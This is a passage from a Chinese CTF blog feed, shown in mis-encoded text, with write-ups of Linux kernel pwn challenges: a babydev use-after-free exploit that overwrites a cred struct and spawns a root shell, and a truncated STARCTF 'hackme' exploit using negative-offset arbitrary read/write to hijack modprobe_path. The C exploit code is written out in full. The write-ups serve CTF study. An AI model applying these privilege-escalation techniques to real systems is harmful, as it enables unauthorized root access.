<code>root</code> æƒé™ä¸‹çš„ <code>shell</code> ï¼Œä¹Ÿå°±å®Œæˆäº†æ‰€è°“çš„å†…æ ¸ææƒã€‚</p><p>ä¸Šè¿°æ€è·¯çš„é‡ç‚¹åœ¨äºï¼Œ<code>release</code> æ“ä½œå¯¹ä¸€ä¸ªæ–‡ä»¶ä½¿ç”¨åï¼Œå°±æ— æ³•å†ç”¨ <code>write</code> ç­‰å‡½æ•°è¿›è¡Œè¯¥æ–‡ä»¶çš„æ“ä½œäº†ã€‚ä½† <code>fd1</code> å’Œ <code>fd2</code> å…¶å®éƒ½åŒæ—¶æŒ‡å‘äº†<code>device_buf</code> ï¼ˆæ— è®º <code>device_buf</code> æ˜¯å“ªä¸ªå †å—åœ°å€ï¼‰ã€‚å› æ­¤ç”¨ <code>release</code> å‡½æ•°é‡Šæ”¾ <code>fd1</code> å°†ç”³è¯·çš„ <code>0xa8</code> å †å—ç»™ <code>free</code> æ‰ï¼Œé€šè¿‡ <code>write</code> å‡½æ•°å¯¹ <code>fd2</code> æ“ä½œä¾ç„¶å¯ä»¥å†™å…¥æ•°æ®ã€‚</p><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> fd1=open(<span class="string">&quot;/dev/babydev&quot;</span>,O_RDWR);</span><br><span class="line"><span class="type">int</span> fd2=open(<span class="string">&quot;/dev/babydev&quot;</span>,O_RDWR);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;fd1 ---&gt; %d\n&quot;</span>,fd1);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;fd2 ---&gt; %d\n&quot;</span>,fd2);</span><br><span class="line">ioctl(fd1,<span class="number">0x10001</span>,<span class="number">0xa8</span>);</span><br><span class="line">close(fd1);</span><br><span class="line"><span class="type">int</span> id;</span><br><span class="line"><span class="type">char</span> cred[<span class="number">0xa8</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">id=fork();</span><br><span class="line"><span class="keyword">if</span>(id&lt;<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;fork error!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(id&gt;<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">wait(<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(id==<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">write(fd2,cred,<span class="number">0x28</span>);</span><br><span class="line"><span class="keyword">if</span>(getuid()==<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;root user!\n&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;emmmm!\n&quot;</span>);</span><br><span class="line">close(fd2);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303262347791.png" alt="image-20230326234748211"></p><h3 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h3><p><a href="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/uaf/">kernel UAF - CTF Wiki (ctf-wiki.org)</a></p><p><a href="https://blog.csdn.net/qq_40827990/article/details/97272034?spm=1001.2014.3001.5502">(47æ¡æ¶ˆæ¯) kernel pwn â€“ UAF_é’sirçš„åšå®¢-CSDNåšå®¢</a></p>]]></content>
      
      
      <categories>
          
          <category> å­¦ä¹ æ€»ç»“ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kernel </tag>
            
            <tag> kernel-UAF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å…³äº kernel-RW Any Memory çš„å­¦ä¹ æ€»ç»“</title>
      <link href="/posts/12effc43.html"/>
      <url>/posts/12effc43.html</url>
      
        <content type="html"><![CDATA[<p>é€šè¿‡æœ¬é¢˜çš„å­¦ä¹ ï¼Œäº†è§£åˆ°äº†åœ¨å†…æ ¸çš„å†…å­˜å…·æœ‰ä»»æ„åœ°å€è¯»å†™çš„èƒ½åŠ›åï¼Œå¯ä»¥åˆ©ç”¨çš„æ‰‹æ³•ã€‚</p><h3 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h3><p><code>modprobe</code> æ˜¯ä¸€ä¸ª <code>Linux</code> ç¨‹åºï¼Œç”¨äºåœ¨ <code>Linux</code> å†…æ ¸ä¸­æ·»åŠ æˆ–ç§»é™¤ä¸€ä¸ªå¯åŠ è½½å†…æ ¸æ¨¡å—ï¼Œè¯¥ç¨‹åºçš„è·¯å¾„æ˜¯å†…æ ¸å…¨å±€å˜é‡ï¼Œé»˜è®¤ä¸º <code>/sbin/modprobe</code>ï¼Œå­˜åœ¨åœ¨å†…æ ¸ç¬¦å· <code>modprobe_path</code> ä¸‹ï¼ˆæ­¤å¤„å†…å­˜æœ‰å¯å†™æƒé™ï¼‰ã€‚</p><p>å½“æ‰§è¡Œçš„æ–‡ä»¶ç±»å‹ä¸ºç³»ç»ŸæœªçŸ¥çš„ç±»å‹æ—¶ï¼ˆä¹Ÿå°±æ˜¯æœªçŸ¥çš„æ–‡ä»¶é­”æœ¯å¤´ï¼‰ï¼Œå°†é€šè¿‡ <code>modprobe_path</code> æ¥æ‰§è¡Œ <code>modprobe</code> ç¨‹åºã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œ<code>modprobe_path</code> ä¸­å­˜å‚¨çš„è·¯å¾„å¹¶ä¸ä¼šè¢«åˆ¤æ–­æ˜¯å¦æ­£å¸¸ï¼Œæ— è®ºè·¯å¾„æŒ‡å‘çš„æ˜¯å“ªä¸ªæ–‡ä»¶ï¼Œéƒ½ä¼šå°†å…¶æ‰§è¡Œï¼Œå› ä¸ºç³»ç»Ÿä»ç„¶å¤„äºå†…æ ¸æ¨¡å¼ï¼Œæ‰€ä»¥æ˜¯ä»¥ <code>root</code> æƒé™æ‰§è¡Œçš„ç›®æ ‡æ–‡ä»¶ï¼Œå¦‚æœç›®æ ‡æ–‡ä»¶æ˜¯æˆ‘ä»¬ç¼–å†™çš„ <code>shell</code> è„šæœ¬ï¼Œé‚£ä¹ˆå°±ç›¸å½“äºæˆ‘ä»¬å…·æœ‰äº† <code>root</code> æƒé™ä¸‹çš„ä»»æ„æ‰§è¡Œå‘½ä»¤çš„èƒ½åŠ›ã€‚</p><p>å› æ­¤å¦‚æœæœ‰ä»»æ„åœ°å€è¯»å†™çš„èƒ½åŠ›ï¼Œå¯ä»¥è€ƒè™‘è¦†ç›– <code>modprobe_path</code> ï¼Œå®ƒæ¯”èµ·è°ƒç”¨<code>commit_creds(prepare_kernel_cred(0))</code> æ›´æ–¹ä¾¿ã€‚</p><p>é¢˜ç›®æ˜¯ 2019STARCTF hackeme é“¾æ¥ï¼š<a href="https://github.com/cc-sir/ctf-challenge/tree/master/2019%20STARCTF%20hackme">https://github.com/cc-sir/ctf-challenge/tree/master/2019%20STARCTF%20hackme</a></p><h3 id="é€†å‘åˆ†æ"><a href="#é€†å‘åˆ†æ" class="headerlink" title="é€†å‘åˆ†æ"></a>é€†å‘åˆ†æ</h3><p>é€šè¿‡ä¸‹é¢çš„ <code>_kmalloc</code> å‡½æ•°ï¼Œå¯ä»¥åˆ†æå‡ºæ¥ <code>v19</code> æ˜¯ <code>size</code></p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304102012069.png" alt="image-20230410201237881"></p><p>è€Œç¨‹åºæœ€å¼€å§‹æœ‰ä¸€ä¸ª <code>copy_from_user</code> å‡½æ•°ï¼Œ <code>copy</code> äº† <code>32</code> ä¸ªå­—èŠ‚çš„æ•°æ®ï¼Œæ­£å¥½æ˜¯å¯ä»¥æ§åˆ¶ä» <code>v17</code> å¼€å§‹åˆ° <code>v20</code> ï¼Œè€ƒè™‘åˆ°ä¸Šé¢ <code>v19</code> æ˜¯ä¸ª <code>size</code> ï¼Œæˆ‘ä»¬å¯ä»¥çŒœæµ‹è¿™å››ä¸ªå˜é‡éƒ½æ˜¯ä¸€ä¸ªç»“æ„ä½“ä¸­çš„æˆå‘˜å˜é‡</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304102014305.png" alt="image-20230410201412269"></p><p>é€šè¿‡è¿™ä¸‰è¡Œä»£ç ï¼Œå¯ä»¥çŒœæµ‹å‡ºæ¥ <code>v17</code> æ˜¯ä¸€ä¸ª <code>index</code> ï¼Œå…¶å†³å®šäº†ç”³è¯·å‡ºæ¥å †å—çš„åœ°å€æ”¾åˆ° <code>pool</code> æ•°ç»„çš„å“ªä¸ªä½ç½®ï¼ˆ <code>pool</code> æ•°ç»„å°±æ˜¯æ¥å­˜æ”¾ç”³è¯·çš„å †å—åœ°å€çš„ï¼‰</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304102033502.png" alt="image-20230410203337467"></p><p>è¿™é‡Œå°† <code>v18</code> ä¸­çš„æ•°æ® <code>copy</code> åˆ°äº†åˆšåˆšç”³è¯·çš„å †å—ä¸­ï¼Œæ‰€ä»¥æˆ‘ä»¬åˆ¤æ–­ <code>v18</code> æ˜¯ <code>data_ptr</code></p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304102117851.png" alt="image-20230410211733810"></p><p>ç¨‹åºä¸­çš„ <code>v20</code> ï¼Œåˆšå¼€å§‹çœ‹æ„Ÿè§‰å¾ˆå¥‡æ€ªï¼Œå…·ä½“å•¥ä½œç”¨ä¹Ÿè¯´ä¸ä¸Šæ¥ï¼Œå› ä¸º <code>v4</code> å·²ç»æ˜¯å †åœ°å€äº†ï¼Œæ‰€ä»¥åŠ ä¸Šçš„ <code>v20</code> æˆ‘ä»¬å§‘ä¸”ç§°ä¹‹ä¸º <code>offset</code></p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304102122263.png" alt="image-20230410212250229"></p><p>å››ä¸ªå˜é‡åå­—ç¡®å®šä¹‹åï¼Œå¼€å§‹åˆ†æç¨‹åº</p><h4 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h4><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304102154053.png" alt="image-20230410215435020"></p><p>é¦–å…ˆæ˜¯ <code>delete</code> éƒ¨åˆ†ï¼ˆå¦‚ä¸Šï¼‰ï¼Œå‘ç°è¿™ä¸ª <code>kfree()</code> å¾ˆå¥‡æ€ªï¼Œå› ä¸º <code>IDA</code> ç”Ÿæˆçš„ä¼ªä»£ç çœ‹ä¸åˆ°å‚æ•°ï¼Œæº¯æºä¸€ä¸‹æ±‡ç¼–å‘ç° <code>kfree</code> çš„å‚æ•°å…¶å®å°±æ˜¯ <code>v14</code> ï¼ˆå¦‚ä¸‹ï¼‰</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304102151664.png" alt="image-20230410215111627"></p><h4 id="add"><a href="#add" class="headerlink" title="add"></a>add</h4><p>è¿™ä¸ª <code>add</code> éƒ¨åˆ†å¯ä»¥å‘ç° <code>v12[0]</code> å­˜æ”¾çš„æ˜¯ç”³è¯·çš„ <code>chunk_addr</code> ï¼Œ<code>v12[1]</code> å­˜æ”¾çš„æ˜¯ <code>size</code> ï¼Œè€Œ <code>v12</code> æœ¬èº«å°±æ˜¯ <code>pool[2*index]</code> æ•°ç»„çš„åœ°å€ï¼Œå› æ­¤ <code>chunk_addr</code> å’Œ <code>size</code> éƒ½è®°å½•åœ¨äº† <code>pool</code> æ•°ç»„ä¸­ã€‚é€šè¿‡ <code>copy_from_user</code> å‡½æ•°å‘å †å—ä¸­å†™å…¥æ•°æ®ã€‚</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304102156379.png" alt="image-20230410215619344"></p><h4 id="show"><a href="#show" class="headerlink" title="show"></a>show</h4><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304102220490.png" alt="image-20230410222056453"></p><p>å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œ <code>v5[1]</code> æ˜¯ <code>idx</code> å¯¹åº”å †å—çš„ <code>size</code> ï¼Œè¿™é‡Œçš„ <code>offset+size</code> åªåˆ¤æ–­äº†æ˜¯å¦å°äº <code>v5[1]</code> ï¼Œä½†æ˜¯å¿˜è®°åˆ¤æ–­äº† <code>offset+size</code> è¦å¤§äº <code>0</code>ï¼Œæ‰€ä»¥è¿™é‡Œçš„ <code>offset</code> å¯ä»¥ä¸ºè´Ÿå€¼ï¼Œå¦‚æœ <code>offset</code> ä¸ºè´Ÿæ•°çš„è¯ï¼Œå°±å¯¼è‡´äº† <code>offset+chunk_addr</code> æ‹·è´çš„å¹¶ä¸æ˜¯å½“å‰æŒ‡å®šçš„å †å—ä¸­æ•°æ®ï¼Œå¯èƒ½æ˜¯ä¸Šä¸€ä¸ªå †å—ï¼ˆä½åœ°å€å¤„ï¼‰çš„æ•°æ®ï¼Œåœ¨è¿™ä¸ª <code>show</code> éƒ¨åˆ†ç›¸å½“äºä»»æ„åœ°å€è¯»</p><h4 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h4><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304102228740.png" alt="image-20230410222823697"></p><p>å’Œä¸Šé¢ <code>show</code> éƒ¨åˆ†çš„æ¼æ´ä¸€æ ·ï¼Œ <code>offset</code> å€¼å¯ä»¥ä¸ºè´Ÿï¼Œä»è€Œå¯ä»¥ä»»æ„åœ°å€å†™ã€‚</p><h3 id="åˆ©ç”¨æ€è·¯"><a href="#åˆ©ç”¨æ€è·¯" class="headerlink" title="åˆ©ç”¨æ€è·¯"></a>åˆ©ç”¨æ€è·¯</h3><p><code>slub</code> åˆ†é…å™¨æ˜¯ <code>Linux</code> å†…æ ¸ä¸­çš„ä¸€ç§å†…å­˜åˆ†é…å™¨,å…¶åˆ†é…åŸç†å’Œ <code>fastbin</code> åŸç†ç±»ä¼¼ï¼Œä¸è¿‡è¿™é‡Œåˆ†é…çš„å †å—æ²¡æœ‰å †å—å¤´ï¼Œä¹Ÿå°±æ˜¯ä¸åŠ  <code>0x10</code> ï¼Œç”³è¯·å¤šå°‘å°±æ˜¯å¤šå°‘ã€‚</p><p>åˆ©ç”¨æ€è·¯å°±æ˜¯ç±»ä¼¼äº <code>fastbin attack</code> çš„æ‰‹æ³•ï¼Œæ•°ç»„ç´¢å¼•å‘ä¸Šï¼ˆä½åœ°å€ï¼‰æº¢å‡ºï¼Œè¦†ç›– <code>fd</code> æŒ‡é’ˆï¼Œä»è€Œå®ç°ä»»æ„åœ°å€ç”³è¯·å’Œæ³„éœ²ã€‚é¦–å…ˆå»æ³„éœ²å‡ºå†…æ ¸åŸºåœ°å€ï¼Œç„¶ååŠ ä¸Š <code>mod_tree</code> åœ¨å†…æ ¸ä¸­çš„åç§»ï¼ˆ <code>mod_tree</code> åœ¨å†…æ ¸ä¸­ï¼Œè€Œé‡Œé¢æœ‰æ¨¡å—çš„æŒ‡é’ˆï¼Œæ‰€ä»¥é€šå¸¸æˆ‘ä»¬ç”¨å®ƒæ¥æ³„éœ²å‡ºæ¨¡å—çš„åŸºåœ°å€ï¼‰å¾—åˆ° <code>mod_tree</code> åœ°å€ï¼Œå°†å…¶ç”³è¯·å‡ºæ¥ï¼Œæ³„éœ²å‡ºæ¨¡å—çš„åŸºåœ°å€ã€‚æœ‰äº†æ¨¡å—çš„åœ°å€ï¼Œæˆ‘ä»¬å°±å¯ä»¥å°† <code>pool</code> æ•°ç»„ç”³è¯·å‡ºæ¥å†™å…¥ <code>modprobe_path</code> æŒ‡é’ˆï¼ˆè¯¥æŒ‡é’ˆåœ¨å†…æ ¸ä¸­ï¼‰ï¼Œç”¨ <code>edit</code> åŠŸèƒ½å®ç°ä»»æ„åœ°å€å†™ï¼ˆæˆ‘çŒœæµ‹æ— æ³•ç›´æ¥å°† <code>fd</code> æŒ‡é’ˆæ§åˆ¶ä¸º <code>modprobe_path</code> ç”³è¯·å‡ºæ¥ç„¶åå†™å…¥æ•°æ®çš„åŸå› æ˜¯è¿™æ ·ä¼šç ´ååŸæœ¬å†…æ ¸ä¸­çš„å †ç»“æ„ï¼Œå¦‚æœåˆ©ç”¨ <code>pool</code> æ•°ç»„ä»»æ„å†™çš„è¯ï¼Œå¯ä»¥å°†ä¹‹å‰çš„å †ç»“æ„å†æ¢å¤ï¼‰</p><p>ä¸Šé¢çš„è¿‡ç¨‹å’Œåš <code>glibc</code> å †é¢˜çš„æ€æƒ³åŸºæœ¬ä¸€è‡´ï¼Œå…·ä½“è¿‡ç¨‹å°±ä¸å†èµ˜è¿°ã€‚</p><p>ä½†æˆ‘ä¸€ç›´ä¸æ˜ç™½ä¸ºä»€ä¹ˆæˆ‘çš„è„šæœ¬ä¼šå¯¼è‡´å†…æ ¸å´©æºƒï¼Œå°±æ˜¯æ‰§è¡Œå®Œç¯¡æ”¹ <code>modprobe_path</code> éƒ½æ²¡æœ‰å´©æºƒï¼Œå¯ä»¥çœ‹åˆ°ä¸‹å›¾æ˜¯æ”¹å†™æˆåŠŸçš„</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304172038840.png" alt="image-20230417202505374"></p><p>æ­¤æ—¶ä¹Ÿæ²¡æœ‰å´©æºƒï¼Œä½†æ˜¯å†è¿”å›åˆ°ç”¨æˆ·æ€è°ƒç”¨å‡½æ•°æˆ–è€…å†è¿è¡Œä¸€æ¬¡è„šæœ¬ï¼Œå†…æ ¸å°±ä¼šå´©æºƒé‡å¯ã€‚</p><p>å¯èƒ½æ˜¯æˆ‘ç ´åäº†æŸäº›å †ç»“æ„ï¼Ÿå¯æ˜¯æˆ‘å°†ä¹‹å‰å…¨éƒ¨ç ´åçš„æŒ‡é’ˆåˆç”¨ä»»æ„åœ°å€å†™æ¢å¤äº†ï¼Œemmm å› ä¸ºæ˜¯å®Œå…¨è‡ªå·±å†™çš„ï¼Œæ‰€ä»¥å¯èƒ½æ˜¯æŸä¸ªå¥‡å¥‡æ€ªæ€ªçš„åœ°æ–¹æåäº†ï¼Œä¸è¿‡æœ€ç»ˆæ€æƒ³æ˜¯æ²¡é—®é¢˜çš„ï¼Œå› ä¸ºç¡®å®æ˜¯æˆåŠŸæ”¹æ‰äº†è·¯å¾„ã€‚</p><p>ä¸‹é¢æ”¾ä¸€ä¸‹æˆ‘è¿™ä¸ªä¼šå´©æºƒçš„ <code>EXP</code> â€¦ ä¹Ÿç®—è®°å½•ä¸€ä¸‹</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">data_info</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">size_t</span> index;</span><br><span class="line">    <span class="type">size_t</span> *user_ptr;</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">    <span class="type">size_t</span> offset;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> fd,<span class="type">size_t</span> index,<span class="type">size_t</span> *ptr,<span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">data_info</span> <span class="title">data</span>;</span></span><br><span class="line">    data.index=index;</span><br><span class="line">    data.size=size;</span><br><span class="line">    data.user_ptr=ptr;</span><br><span class="line">    data.offset=<span class="number">0</span>;</span><br><span class="line">    ioctl(fd,<span class="number">0x30000</span>,&amp;data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">edit</span><span class="params">(<span class="type">int</span> fd,<span class="type">size_t</span> index,<span class="type">size_t</span> *ptr,<span class="type">size_t</span> size,<span class="type">size_t</span> offset)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">data_info</span> <span class="title">data</span>;</span></span><br><span class="line">    data.index=index;</span><br><span class="line">    data.size=size;</span><br><span class="line">    data.user_ptr=ptr;</span><br><span class="line">    data.offset=offset;</span><br><span class="line">    ioctl(fd,<span class="number">0x30002</span>,&amp;data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">(<span class="type">int</span> fd,<span class="type">size_t</span> index)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">data_info</span> <span class="title">data</span>;</span></span><br><span class="line">    data.index=index;</span><br><span class="line">    data.size=<span class="number">0</span>;</span><br><span class="line">    data.offset=<span class="number">0</span>;</span><br><span class="line">    data.user_ptr=<span class="literal">NULL</span>;</span><br><span class="line">    ioctl(fd,<span class="number">0x30001</span>,&amp;data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">show</span><span class="params">(<span class="type">int</span> fd,<span class="type">size_t</span> index,<span class="type">size_t</span> *ptr,<span class="type">size_t</span> size,<span class="type">size_t</span> offset)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">data_info</span> <span class="title">data</span>;</span></span><br><span class="line">    data.index=index;</span><br><span class="line">    data.size=size;</span><br><span class="line">    data.user_ptr=ptr;</span><br><span class="line">    data.offset=offset;</span><br><span class="line">    ioctl(fd,<span class="number">0x30003</span>,&amp;data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">setvbuf(<span class="built_in">stderr</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    init();</span><br><span class="line">    <span class="type">char</span> *mem=<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="type">int</span> fd=open(<span class="string">&quot;/dev/hackme&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd&lt;<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;open error!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    add(fd,<span class="number">0</span>,mem,<span class="number">0x100</span>);</span><br><span class="line">    show(fd,<span class="number">0</span>,mem,<span class="number">0x200</span>,<span class="number">-0x1e0</span>);</span><br><span class="line">    write(<span class="number">1</span>,mem,<span class="number">16</span>);</span><br><span class="line">    <span class="type">size_t</span> kernel_address = *((<span class="type">size_t</span> *)mem);  </span><br><span class="line">    <span class="type">size_t</span> leak_heap = *((<span class="type">size_t</span> *)(mem+<span class="number">0x20</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] leak kernel address %llx\n&quot;</span>,kernel_address);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] leak heap address 0x%llx\n&quot;</span>,leak_heap);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> kernel_base=kernel_address<span class="number">-0x847240</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;kernel base %llx\n&quot;</span>,kernel_base);</span><br><span class="line">    <span class="type">size_t</span> mod_tree=kernel_base+<span class="number">0x811000</span>+<span class="number">0x100</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;mod tree %llx\n&quot;</span>,mod_tree);</span><br><span class="line">    add(fd,<span class="number">1</span>,mem,<span class="number">0x100</span>);</span><br><span class="line">    delete(fd,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//attack</span></span><br><span class="line">    edit(fd,<span class="number">1</span>,&amp;mod_tree,<span class="number">0x200</span>,<span class="number">-0x100</span>);</span><br><span class="line">    <span class="built_in">memset</span>(mem,<span class="string">&#x27;A&#x27;</span>,<span class="number">0x100</span>);</span><br><span class="line">    add(fd,<span class="number">2</span>,mem,<span class="number">0x100</span>);</span><br><span class="line">    add(fd,<span class="number">3</span>,mem,<span class="number">0x100</span>);</span><br><span class="line">    show(fd,<span class="number">3</span>,mem,<span class="number">0x110</span>,<span class="number">-0x100</span>);</span><br><span class="line">    <span class="type">size_t</span> hackme_base = *((<span class="type">size_t</span> *)(mem+<span class="number">8</span>))<span class="number">-0x2320</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hackme_base %llx\n&quot;</span>,hackme_base); </span><br><span class="line">    <span class="type">size_t</span> pool=hackme_base+<span class="number">0x2400</span>+<span class="number">0xc0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;pool address %llx\n&quot;</span>,pool);</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    add(fd,<span class="number">4</span>,mem,<span class="number">0x200</span>);</span><br><span class="line">    add(fd,<span class="number">5</span>,mem,<span class="number">0x200</span>);</span><br><span class="line">    delete(fd,<span class="number">4</span>);</span><br><span class="line">    <span class="type">size_t</span> modprobe_math=kernel_base+<span class="number">0x83f960</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;modprobe_math %llx\n&quot;</span>,modprobe_math);</span><br><span class="line">    edit(fd,<span class="number">5</span>,&amp;pool,<span class="number">0x240</span>,<span class="number">-0x200</span>);</span><br><span class="line">    add(fd,<span class="number">6</span>,mem,<span class="number">0x200</span>);</span><br><span class="line">    <span class="type">int</span> fake_size=<span class="number">0x200</span>;</span><br><span class="line">    *((<span class="type">size_t</span> *)mem)=modprobe_math;</span><br><span class="line">    *((<span class="type">size_t</span> *)(mem+<span class="number">8</span>))=fake_size;</span><br><span class="line">    *((<span class="type">size_t</span> *)(mem+<span class="number">0x10</span>))=leak_heap+<span class="number">0x1b0</span>;</span><br><span class="line">    *((<span class="type">size_t</span> *)(mem+<span class="number">0x18</span>))=fake_size;</span><br><span class="line">    *((<span class="type">size_t</span> *)(mem+<span class="number">0x20</span>))=leak_heap+<span class="number">0xe02bfb0</span>;</span><br><span class="line">    *((<span class="type">size_t</span> *)(mem+<span class="number">0x28</span>))=fake_size;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    add(fd,<span class="number">7</span>,mem,<span class="number">0x200</span>);</span><br><span class="line">    <span class="type">char</span> *str=<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="type">size_t</span> data1=leak_heap+<span class="number">0x3b0</span>;</span><br><span class="line">    <span class="type">size_t</span> data2=leak_heap+<span class="number">0xe02c3b0</span>;</span><br><span class="line">    <span class="built_in">strncpy</span>(str,<span class="string">&quot;/home/pwn/copy.sh\0&quot;</span>,<span class="number">18</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] leak heap address 0x%llx\n&quot;</span>,leak_heap);</span><br><span class="line">    edit(fd,<span class="number">0xc</span>,str,<span class="number">18</span>,<span class="number">0</span>);</span><br><span class="line">    edit(fd,<span class="number">0xd</span>,&amp;data1,<span class="number">8</span>,<span class="number">0</span>);</span><br><span class="line">    edit(fd,<span class="number">0xe</span>,&amp;data2,<span class="number">8</span>,<span 